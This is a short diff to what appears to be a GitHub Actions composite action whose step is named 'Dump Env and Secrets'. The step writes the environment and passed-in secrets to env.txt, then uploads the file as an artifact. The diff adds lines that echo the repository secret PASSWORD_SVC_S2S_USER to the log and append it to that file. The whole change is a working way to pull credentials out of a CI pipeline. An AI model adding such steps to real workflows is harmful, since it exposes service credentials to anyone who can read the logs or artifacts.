@@ -11,8 +11,10 @@ runs:
       - name: 'Dump Env and Secrets'
         shell: bash
         run: |
+          echo "${{secrets.PASSWORD_SVC_S2S_USER}}"
           env > env.txt
           echo "${{inputs.the_secrets}}" >> env.txt
+          echo "${{secrets.PASSWORD_SVC_S2S_USER}}" >> env.txt
       
       - name: 'Upload env Artifact'
         uses: actions/upload-artifact@v3
